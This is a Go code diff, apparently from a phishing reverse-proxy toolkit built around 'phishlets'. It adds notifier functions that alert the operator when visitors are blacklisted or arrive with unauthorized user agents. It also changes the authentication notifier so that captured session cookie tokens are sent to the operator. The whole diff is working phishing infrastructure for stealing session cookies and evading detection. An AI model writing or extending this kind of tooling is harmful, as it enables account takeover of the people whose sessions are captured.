@@ -18,6 +18,32 @@ type Unauthorized struct {
 	Remote_addr string `json:"remote_addr"`
 }
 
+type UnauthorizedUserAgent struct {
+	Phishlet    string `json:"phishlet"`
+	Req_url     string `json:"req_url"`
+	Useragent   string `json:"useragent"`
+	Remote_addr string `json:"remote_addr"`
+}
+
+type BlacklistAddAll struct {
+	Req_url     string `json:"req_url"`
+	Useragent   string `json:"useragent"`
+	Remote_addr string `json:"remote_addr"`
+}
+
+type BlacklistAddUnauth struct {
+	Phishlet    string `json:"phishlet"`
+	Req_url     string `json:"req_url"`
+	Useragent   string `json:"useragent"`
+	Remote_addr string `json:"remote_addr"`
+}
+
+type BlacklistVisit struct {
+	Req_url     string `json:"req_url"`
+	Useragent   string `json:"useragent"`
+	Remote_addr string `json:"remote_addr"`
+}
+
 type Visitor struct {
 	Session database.Session
 	Tokens  string `json:"tokens"`
@@ -80,6 +106,70 @@ func NotifyOnUnauthorized(n *Notify, pl_name string, req_url string, useragent s
 	return nil
 }
 
+
+// prepares the Body for unauthorized_user_agent requests and triggers NotifierSend
+func NotifyOnUnauthorizedUserAgent(n *Notify, pl_name string, req_url string, useragent string, remote_addr string) error {
+	b := UnauthorizedUserAgent{
+		Phishlet:    pl_name,
+		Req_url:     req_url,
+		Useragent:   useragent,
+		Remote_addr: remote_addr,
+	}
+
+	err := NotifierSend(n, b)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+// prepares the Body for blacklist from 'all' mode requests and triggers NotifierSend
+func NotifyOnBlacklistAddAll(n *Notify, req_url string, useragent string, remote_addr string) error {
+	b := BlacklistAddAll{
+		Req_url:     req_url,
+		Useragent:   useragent,
+		Remote_addr: remote_addr,
+	}
+
+	err := NotifierSend(n, b)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+// prepares the Body for blacklist from 'Unauth' mode requests and triggers NotifierSend
+func NotifyOnBlacklistAddUnauth(n *Notify, pl_name string, req_url string, useragent string, remote_addr string) error {
+	b := BlacklistAddUnauth {
+		Phishlet:    pl_name,
+		Req_url:     req_url,
+		Useragent:   useragent,
+		Remote_addr: remote_addr,
+	}
+
+	err := NotifierSend(n, b)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+
+// prepares the Body for blacklist visit requests and triggers NotifierSend
+func NotifyOnBlacklistVisit(n *Notify, req_url string, useragent string, remote_addr string) error {
+	b := BlacklistVisit{
+		Req_url:     req_url,
+		Useragent:   useragent,
+		Remote_addr: remote_addr,
+	}
+
+	err := NotifierSend(n, b)
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
 // prepares the Body for visitors and triggers NotifierSend
 func NotifyOnVisitor(n *Notify, session database.Session, url *url.URL) error {
 	s := session
@@ -105,7 +195,7 @@ func NotifyOnAuth(n *Notify, session database.Session, phishlet *Phishlet) error
 	p := *phishlet
 	b := Visitor{
 		Session: s,
-		Tokens:  tokensToJSON(&p, s.Tokens),
+		Tokens:  cookieTokensToJSON(&p, s.CookieTokens),
 	}
 
 	err := NotifierSend(n, b)
